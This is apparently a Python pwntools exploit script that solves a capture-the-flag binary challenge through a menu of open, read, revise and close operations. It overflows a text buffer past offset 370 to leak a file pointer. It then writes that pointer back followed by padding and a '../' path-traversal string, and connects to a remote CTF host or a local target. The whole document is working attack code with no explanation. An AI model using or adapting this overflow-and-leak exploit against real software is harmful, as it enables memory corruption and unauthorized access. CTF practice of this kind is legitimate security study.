#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./chall"

rhp1 = {"host":"13.231.207.73","port":9008}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def hoge(conn,ix):
  conn.recvuntil("> ")
  conn.sendline(str(ix))

def _open(conn):
  hoge(conn,1)

def _read(conn):
  hoge(conn,2)
  conn.recvuntil("--*\n")
  return conn.recvuntil("*")[:-1]

def _revise(conn,off,text):
  hoge(conn,3)
  conn.recvuntil("Offset: ")
  conn.sendline(str(off))
  conn.recvuntil("Text: ")
  conn.send(text)
  
def _close(conn):
  hoge(conn,4)  

original_len = 370
margin = 0x90-2 #オリジナルのtextの末尾とfpとのオフセット

def exploit(conn):
  _open(conn)
  _read(conn)
  _revise(conn,370,"A"*margin)
  fp =  unpack(_read(conn).split("A"*margin)[1].ljust(8,'\x00'))
  print("[*]fp: "+hex(fp))

  _revise(conn,370,"A"*margin + p64(fp) + "B"*0x18 + "../../../../../../../\x00")
  _close(conn)


if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

